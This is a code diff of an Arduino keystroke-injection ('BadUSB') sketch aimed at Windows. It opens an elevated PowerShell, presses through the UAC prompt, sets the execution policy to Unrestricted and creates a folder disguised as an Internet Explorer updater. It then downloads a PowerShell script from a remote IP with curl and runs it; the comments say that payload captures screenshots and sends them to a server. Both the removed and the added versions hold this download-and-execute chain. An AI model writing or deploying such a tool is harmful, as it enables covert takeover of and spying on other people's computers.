@@ -1,67 +1,52 @@
 #include <Keyboard.h>
+int big_delay = 2000, low_delay = 500;
 
-#define BIG 1000
-#define MID 100
-#define LOW 15
 
 void setup() {
-  Keyboard.begin();
-  delay(3500);
-
-
+  Keyboard.begin();   //Keyboard library initialization
+  delay(10000); 
 }
+
+// Enter press emulation
+void press_enter(){ 
+  Keyboard.press(KEY_RETURN);
+  delay(low_delay);
+  Keyboard.releaseAll();
+  delay(low_delay);
+}
+
+// Simpe UAC Bypass by pressing yes
+void UAC_bypass(){ 
+  delay(big_delay);
+  Keyboard.press(KEY_LEFT_ARROW);
+  delay(low_delay);
+  Keyboard.releaseAll();
+  press_enter();
+}
+
 
 void loop() {
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
 
-  delay(LOW);
+  delay(low_delay);
   Keyboard.releaseAll();
-  delay(MID);
-  Keyboard.println("powershell Start-Process powershell -Verb runAs");
-  delay(BIG);
-  Keyboard.press(KEY_LEFT_ARROW);
-  delay(MID);
-  Keyboard.releaseAll();
-  delay(MID);
-  Keyboard.press(KEY_RETURN);
-  delay(LOW);
-  Keyboard.releaseAll();
-  delay(BIG);
+  delay(big_delay);
 
+  Keyboard.println("powershell Start-Process powershell -Verb runAs"); // Here we starts an powershell with admin rights
+  UAC_bypass();
 
-  delay(BIG);
-  Keyboard.print("Set-ExecutionPolicy -Scope Process Unrestricted -Force");
-  Keyboard.press(KEY_RETURN);
-  delay(LOW);
-  Keyboard.releaseAll();
-  delay(LOW);
-  Keyboard.print("mkdir IexplorerUpdater"); 
-  Keyboard.press(KEY_RETURN);
-  delay(LOW);
-  Keyboard.releaseAll();
-  delay(LOW);
-  Keyboard.print("curl -o IEUpdater.ps1 http://172.16.26.25:8763"); 
-  Keyboard.press(KEY_RETURN);
-  delay(LOW);
-  Keyboard.releaseAll();
-  delay(LOW);
-  Keyboard.print("./IexplorerUpdater/Iexplorer.ps1");
-  Keyboard.press(KEY_RETURN);
-  delay(LOW);
-  Keyboard.releaseAll();
-  delay(LOW);
+  Keyboard.println("Set-ExecutionPolicy -Scope Process Unrestricted -Force"); // Changing execution policy for powershell scripts in os
+  press_enter();
 
+  Keyboard.println("mkdir IexplorerUpdater"); // This is implementation of persistence. We make dir, wich look like system
+  press_enter();
 
+  Keyboard.println("curl -o IexplorerUpdater/IEUpdater.ps1 http://127.0.0.1:40004"); // Downloading bad code from server
+  press_enter();
 
-  delay(5000);
-
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.write(' ');
-
-  delay(LOW);
-  Keyboard.releaseAll();
-  delay(MID);
+  Keyboard.println("./IexplorerUpdater/IEUpdater.ps1"); // Here we start our payload wich created screenshoot and send it to server
+  press_enter();
+  delay(300000); // 30 secunds wait for next execution
 
 }
-
